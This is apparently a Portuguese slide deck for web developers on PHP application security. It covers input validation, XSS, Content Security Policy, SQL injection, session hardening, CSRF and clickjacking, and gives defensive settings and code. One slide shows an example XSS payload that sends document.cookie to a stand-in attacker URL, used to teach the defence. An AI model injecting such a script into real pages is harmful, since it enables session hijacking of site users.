#HSLIDE
# Segurança no desenvolvimento web
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Ubuntu+Mono">
#HSLIDE
## Pilares da Segurança da Informação  
- Confidencialidade
- Integridade
- Disponibilidade
## Princípios  
- Segurança em múltiplas camadas
- Considere que cada camada eventualmente falhará
- Forneça o mínimo de informação necessária
#HSLIDE
## Validação de entradas
Considerando que a requisição HTTP pode ser manipulada pelo cliente, toda entrada do usuário deve ser validada.
#HSLIDE
### Proteção
- Para isso, o PHP oferece as extensões ***ctype*** e ***filter***. 
Além disso, a maioria dos frameworks de mercado implementam algum tipo de tratamento/sanitização de dados.
- PHP 7+ oferece ***type declarations*** que permitem especificar o tipo esperado de parâmetros.
Para isso:
`declare(strict_types=1);`
#HSLIDE
## Cross-site scripting (XSS)
Ocorre quando um script inserido por um usuário é armazenado e/ou executado pela aplicação. 
#HSLIDE
### Exemplo
```javascript
<script>
(new Image()).src = “http://urldoatacante/?” + escape(document.cookie);
</script>
```
#HSLIDE
### Tipos
* Armazenado
* Não-persistente
* Baseado em DOM
#HSLIDE
### Consequências
- Roubo de *cookie*/sessão
- Manipulação de DOM
- *Keylogger*
- *Browser exploits*
- Basicamente tudo que o JavaScript permite
#HSLIDE
### Proteção
- [*Same-origin Policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) faz com que apenas códigos do mesmo *origin* (protocolo/domínio/porta) tenham acesso à aplicação, ao mesmo tempo que permite acesso a arquivos externos (uma lib como o [JQuery](https://jquery.com/), por exemplo)
- Filtrar entradas ([*strip_tags*](http://php.net/manual/en/function.strip-tags.php), [*filter_var*](http://php.net/manual/en/function.filter-var.php), [*preg_replace*](http://php.net/manual/en/function.preg-replace.php))
- Escapar as saídas ([*htmlspecialchars*](http://php.net/manual/en/function.htmlspecialchars.php), [*htmlentities*](http://php.net/manual/en/function.htmlentities.php), [*filter_var*](http://php.net/manual/en/function.filter-var.php))
- Aplicar [*Content Security Policy*](https://content-security-policy.com/) (*default-src*, *img-src*, *script-src*), para isso, o ideal é eliminar código inline
#HSLIDE
### Testando a CSP
```
Content-Security-Policy-Report-Only
report-uri /caminho/arquivo.php
```
#HSLIDE
## SQL Injection

### Proteção
- Não concatenar dados (parâmetros) com comandos
- Utilizar prepared statements
- Validar entradas
- Escapar caracteres
#HSLIDE
## Gerenciamento de estado

### Proteção
- Usar HTTPS
- Definir *secure* e *HttpOnly* *flags*
- Prevenir XSS
- [Alterar](http://php.net/manual/en/function.session-regenerate-id.php) ID de sessão
- Armazenar informação do usuário na sessão (*headers*)
- Detectar sequestro de sessão
- Usar [HSTS](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet) para dificultar o roubo de sessão
#HSLIDE
### Diretivas
```php
session.use_strict_mode = true;
session.cookie_secure = true;
session.use_only_cookies = true;
session.cookie_httponly = true;

Strict-Transport-Security: max-age=86400; includeSubDomains
```
#HSLIDE
## Cross-site Request Forgery (CSRF)
Causado por vírus, scam/phishing, site/redirecionamento malicioso

### Proteção
- Não usar GET para operações que envolvam manipulação de dados (porém, o POST também pode ser manipulado)
- Enviar token 
#HSLIDE
### Clickjacking
Atacante cria página e, através de requisições para o site alvo (usualmente via iframe), aproveita-se da sessão do usuário

#### Proteção
`header(‘X-FRAME-OPTIONS’, ‘DENY’); //ou SAMEORIGIN`
#HSLIDE
## Ferramentas
- [Arachni web scanner](http://www.arachni-scanner.com/)
- [Dependencies security checker](https://github.com/sensiolabs/security-checker)
#HSLIDE
## Referências
[OWASP](https://www.owasp.org)
